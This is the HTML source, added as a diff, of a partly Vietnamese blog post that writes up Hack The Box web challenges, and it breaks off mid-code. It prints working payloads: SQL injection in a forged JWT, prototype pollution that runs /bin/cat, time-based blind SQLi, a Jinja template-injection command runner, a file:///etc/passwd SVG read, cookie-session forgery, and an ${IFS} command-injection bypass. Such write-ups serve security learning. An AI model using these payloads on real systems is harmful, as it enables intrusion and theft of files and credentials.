@@ -1,0 +1,1756 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Htb web chall ctf 2024 - solved challenges - part 4 - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Hack the box (part4) - Medium Under Construction GET / HTTP/1.1Host: 94.237.49.212:43743User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg&#43;xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://burpsuite/Connection: closeCookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBcUpgrade-Insecure-Requests: 1Priority: u=0, iflag: HTB{d0n7_3xp053_y0ur_publ1ck3y}
+breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-08-23-hackthebox-web-challpart4\/",
+          "name": "Htb web chall ctf 2024 solved challenges part 4"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Htb web chall ctf 2024 - solved challenges - part 4",
+  "description" : "Hack the box (part4) - Medium Under Construction GET \/ HTTP\/1.1\rHost: 94.237.49.212:43743\rUser-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko\/20100101 Firefox\/130.0\rAccept: text\/html,application\/xhtml\u002bxml,application\/xml;q=0.9,image\/avif,image\/webp,image\/png,image\/svg\u002bxml,*\/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate, br\rReferer: http:\/\/burpsuite\/\rConnection: close\rCookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBc\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rflag: HTB{d0n7_3xp053_y0ur_publ1ck3y}\nbreaking grad POST \/api\/calculate HTTP\/1.1\rHost: 83.136.249.80:30878\rUser-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko\/20100101 Firefox\/130.0\rAccept: *\/*\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate, br\rReferer: http:\/\/83.",
+  "inLanguage" : "en",
+  "wordCount":  5663 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-08-23-hackthebox-web-challpart4\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Htb web chall ctf 2024 - solved challenges - part 4" />
+<meta property="og:description" content="Hack the box (part4) - Medium Under Construction GET / HTTP/1.1Host: 94.237.49.212:43743User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg&#43;xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://burpsuite/Connection: closeCookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBcUpgrade-Insecure-Requests: 1Priority: u=0, iflag: HTB{d0n7_3xp053_y0ur_publ1ck3y}
+breaking grad POST /api/calculate HTTP/1.1Host: 83.136.249.80:30878User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-08-23-hackthebox-web-challpart4/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Htb web chall ctf 2024 - solved challenges - part 4" />
+  <meta name="twitter:description" content="Hack the box (part4) - Medium Under Construction GET / HTTP/1.1Host: 94.237.49.212:43743User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Htb web chall ctf 2024 - solved challenges - part 4</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="hack-the-box-part4---medium">Hack the box (part4) - Medium</h1>
+<h2 id="under-construction">Under Construction</h2>
+<pre><code>GET / HTTP/1.1
+Host: 94.237.49.212:43743
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://burpsuite/
+Connection: close
+Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBc
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+</code></pre><p><img src="https://hackmd.io/_uploads/ByFI-OqaC.png" alt="image"></p>
+<p>flag: <code>HTB{d0n7_3xp053_y0ur_publ1ck3y}</code></p>
+<h2 id="breaking-grad">breaking grad</h2>
+<pre><code>POST /api/calculate HTTP/1.1
+Host: 83.136.249.80:30878
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.249.80:30878/
+Content-Type: application/json
+Content-Length: 113
+Origin: http://83.136.249.80:30878
+Connection: close
+Priority: u=0
+
+{&quot;name&quot;:&quot;hi&quot;,&quot;constructor&quot;:{
+&quot;prototype&quot;:{
+&quot;execPath&quot;:   &quot;/bin/cat&quot;,
+&quot;execArgv&quot;: [
+&quot;./flag_e1T6f&quot;
+]
+}
+}
+}
+</code></pre><p><img src="https://hackmd.io/_uploads/SJu3O_5TC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJ56Odq6A.png" alt="image"></p>
+<p>flag: <code>HTB{l00s1ng_t3nur3_l1k3_it5_fr1d4y_m0rn1ng}</code></p>
+<h2 id="wafwaf">wafwaf</h2>
+<p><code>' union select case when (SUBSTRING(flag,{i},1)='{char}') then sleep(10) else sleep(0) end from definitely_not_a_flag-- -</code></p>
+<pre><code>POST / HTTP/1.1
+Host: 83.136.249.80:53993
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Contype-type: application/json
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Length: 122
+
+{
+&quot;user&quot;: &quot;\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0063\u0061\u0073\u0065\u0020\u0077\u0068\u0065\u006E\u0020\u0028\u0053\u0055\u0042\u0053\u0054\u0052\u0049\u004E\u0047\u0028\u0066\u006C\u0061\u0067\u002C\u007B\u0069\u007D\u002C\u0031\u0029\u003D\u0027\u007B\u0063\u0068\u0061\u0072\u007D\u0027\u0029\u0020\u0074\u0068\u0065\u006E\u0020\u0073\u006C\u0065\u0065\u0070\u0028\u0031\u0030\u0029\u0020\u0065\u006C\u0073\u0065\u0020\u0073\u006C\u0065\u0065\u0070\u0028\u0030\u0029\u0020\u0065\u006E\u0064\u0020\u0066\u0072\u006F\u006D\u0020\u0064\u0065\u0066\u0069\u006E\u0069\u0074\u0065\u006C\u0079\u005F\u006E\u006F\u0074\u005F\u0061\u005F\u0066\u006C\u0061\u0067\u002D\u002D\u0020\u002D&quot;}
+</code></pre><h2 id="baby-ninja-ninja">baby ninja ninja</h2>
+<p><code>{% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&amp;key=leader&amp;command=id</code></p>
+<p>flag: ``</p>
+<h2 id="mutation-lab">Mutation Lab</h2>
+<p><img src="https://hackmd.io/_uploads/SJD5GNYRC.png" alt="image"></p>
+<p>Như ta có thể thấy là ở đây đang sử dụng <code>convert-svg-core</code> để convert svg sang png <code>Directory Traversal CVE-2021-23631</code>.</p>
+<p>-&gt; bây giờ thì đấm thôi:</p>
+<pre><code>POST /api/export HTTP/1.1
+Host: 94.237.51.124:38432
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.51.124:38432/dashboard
+Content-Type: application/json
+Content-Length: 275
+Origin: http://94.237.51.124:38432
+Connection: close
+Cookie: session=eyJ1c2VybmFtZSI6ImwzbW50MjAxMCJ9; session.sig=PAXdZgGIPZMJ9aFWrfQvX3cxesk
+Priority: u=0
+
+{&quot;svg&quot;:&quot;&lt;svg-dummy&gt;&lt;/svg-dummy&gt;&lt;iframe src=\&quot;file:///etc/passwd\&quot; width=\&quot;100%\&quot; height=\&quot;1000px\&quot;&gt;&lt;/iframe&gt;&lt;svg viewBox=\&quot;0 0 240 80\&quot; height=\&quot;1000\&quot; width=\&quot;1000\&quot; xmlns=\&quot;http://www.w3.org/2000/svg\&quot;&gt;&lt;text x=\&quot;0\&quot; y=\&quot;0\&quot; class=\&quot;Rrrrr\&quot; id=\&quot;demo\&quot;&gt;data&lt;/text&gt;&lt;/svg&gt;&quot;
+}
+</code></pre><p><img src="https://hackmd.io/_uploads/rytSEEY0R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByZPEVFCA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryxCVEKR0.png" alt="image"></p>
+<p>Thử flag.txt và flag nhưng không thấy có flag nên ta đọc file của chall để xem vị trí của nó.</p>
+<p><img src="https://hackmd.io/_uploads/HkVtBEKRR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryFuB4KA0.png" alt="image"></p>
+<p>Đọc file <code>/app/routes/index.js</code>:</p>
+<p><img src="https://hackmd.io/_uploads/rJJGUVYAC.png" alt="image"></p>
+<p>có thể thấy nếu session.username của chúng ta là admin thì sẽ nhận được flag.</p>
+<p>-&gt; và chương trình sử dụng session ở đây:</p>
+<p><img src="https://hackmd.io/_uploads/rJbChEFCC.png" alt="image"></p>
+<p>secret-key nằm tại <code>/app/.env</code>:</p>
+<p><img src="https://hackmd.io/_uploads/r1yb64KR0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryDCzBYRR.png" alt="image"></p>
+<p>poc:</p>
+<pre><code>const express        = require('express');
+const session        = require('cookie-session');
+const app            = express();
+const path           = require('path');
+const cookieParser   = require('cookie-parser');
+const nunjucks       = require('nunjucks');
+app.use(express.json({ limit: '2mb' }));
+app.use(cookieParser('fc8c7ef845baff7935591112465173e7'));
+app.use(session({
+    name: 'session',
+    keys: ['fc8c7ef845baff7935591112465173e7']
+}));
+
+nunjucks.configure('views', {
+    autoescape: true,
+    express: app
+});
+
+app.get('/set-session', (req, res) =&gt; {
+    req.session.username = 'admin';
+    res.send('Session has been set with username = admin');
+});
+
+// Route để trả về session username
+app.get('/', (req, res) =&gt; {
+    if (req.session.username) {
+        res.send({
+            message: `Hello, ${req.session.username} ${req.session}`
+        });
+    } else {
+        res.status(404).send({
+            message: '404 page not found'
+        });
+    }
+});
+
+(async () =&gt; {
+    app.listen(1337, '0.0.0.0', () =&gt; console.log('Listening on port 1337'));
+})();
+</code></pre><p><img src="https://hackmd.io/_uploads/Bym-XBFRA.png" alt="image"></p>
+<p>ta truy cập và nhận session admin -&gt;</p>
+<p><img src="https://hackmd.io/_uploads/BkoGXrKCA.png" alt="image"></p>
+<p>dùng session này truy cập ở trên và nhận flag</p>
+<p>flag: <code>HTB{fr4m3d_s3cr37s_4nd_f0rg3d_entr13s}</code></p>
+<h2 id="htb-proxy">HTB Proxy</h2>
+<p>một chall white box với golang proxy recustom và backend chạy <code>express js</code></p>
+<p>Đầu tiên ta sẽ xác định sink và source của chall -&gt; có thể thấy proxy chặn trước backend -&gt; khả năng cao thì sink sẽ nằm ở backend này:</p>
+<p>reconnaissance:</p>
+<h3 id="backend-nodejs">backend [nodejs]</h3>
+<pre><code>const ipWrapper = require(&quot;ip-wrapper&quot;);
+const express = require(&quot;express&quot;);
+
+const app = express();
+app.use(express.json());
+
+const validateInput = (req, res, next) =&gt; {
+    const { interface } = req.body;
+
+    if (
+        !interface || 
+        typeof interface !== &quot;string&quot; || 
+        interface.trim() === &quot;&quot; || 
+        interface.includes(&quot; &quot;)
+    ) {
+        return res.status(400).json({message: &quot;A valid interface is required&quot;});
+    }
+
+    next();
+}
+
+app.post(&quot;/getAddresses&quot;, async (req, res) =&gt; {
+    try {
+        const addr = await ipWrapper.addr.show();
+        res.json(addr);
+    } catch (err) {
+        res.status(401).json({message: &quot;Error getting addresses&quot;});
+    }
+});
+
+app.post(&quot;/flushInterface&quot;, validateInput, async (req, res) =&gt; {
+    const { interface } = req.body;
+
+    try {
+        const addr = await ipWrapper.addr.flush(interface);
+        res.json(addr);
+    } catch (err) {
+        res.status(401).json({message: &quot;Error flushing interface&quot;});
+    }
+});
+
+app.listen(5000, () =&gt; {
+    console.log(&quot;Network utils API is up on :5000&quot;);
+});
+</code></pre><p>cơ bản thì source code chỉ đơn giản như sau ngoài expressjs còn sử dụng một module khác đó là <code>ip-wrapper</code> có 2 api duy nhất đó là <code>getAddresses</code> sẽ trả về giá trị <code>const addr = await ipWrapper.addr.show();</code> dưới dạng json
+còn api còn lại là <code>flushInterface</code> ở đây sẽ chạy qua một middleware đó là <code>validateInput</code> hàm này sẽ thực hiện:</p>
+<pre><code>const validateInput = (req, res, next) =&gt; {
+    const { interface } = req.body;
+
+    if (
+        !interface || 
+        typeof interface !== &quot;string&quot; || 
+        interface.trim() === &quot;&quot; || 
+        interface.includes(&quot; &quot;)
+    ) {
+        return res.status(400).json({message: &quot;A valid interface is required&quot;});
+    }
+
+    next();
+}
+</code></pre><p>nó sẽ nhận giá trị interface sau đó kiểm tra xem có <code>!interface ||  typeof interface !== &quot;string&quot; ||  interface.trim() === &quot;&quot; ||  interface.includes(&quot; &quot;)</code></p>
+<p>Nếu interface dính phải 1 trong các điều kiện này sẽ trả ra lỗi 400 bad request ngược lại thì có thể access đến endpoint của api trên.</p>
+<p>quay trở lại với api nãy:</p>
+<pre><code> const addr = await ipWrapper.addr.flush(interface);
+        res.json(addr);
+</code></pre><p>khả năng cao là đây là sink của vul vì tại đây trông có vẻ là nơi duy nhất ta có thể control được đầu vào.</p>
+<p><img src="https://hackmd.io/_uploads/SyXZKrYCC.png" alt="image"></p>
+<p>Đúng như dự đoán thì <code>ip address flush dev ${interfaceName}</code> tại đây cộng chuỗi trực tiếp nên bị dính command injection -&gt; ta sẽ bám vào đây.</p>
+<p>Câu hỏi nan giải ở đây là bypass được middleware -&gt; nhưng mà trông có vẻ khá đơn giản:</p>
+<p>interface chỉ cần là string và không chứa space ở trong interface -&gt; ở đây chỉ cần dùng <code>${IFS}</code> để bypass này là được.</p>
+<p>Vậy là phần sink đã xử lí xong -&gt; ta sẽ đi tìm phần source và các gadget có thể dẫn đến nó</p>
+<p>vị trí flag nằm ở root:</p>
+<p><img src="https://hackmd.io/_uploads/r1DRkLtRA.png" alt="image"></p>
+<h3 id="proxy-golang">proxy [golang]</h3>
+<p>Đây là giao diện khởi đầu của proxy:</p>
+<p><img src="https://hackmd.io/_uploads/HkIBxUtRR.png" alt="image"></p>
+<p>được recustom http với golang -&gt; ta có thể quan sát nó custom lại:</p>
+<pre><code>type HTTPRequest struct {
+	RemoteAddr string
+	Method     string
+	URL        string
+	Protocol   string
+	Headers    map[string]string
+	Body       string
+}
+
+type HTTPResponse struct {
+	Protocol      string
+	StatusCode    int
+	StatusMessage string
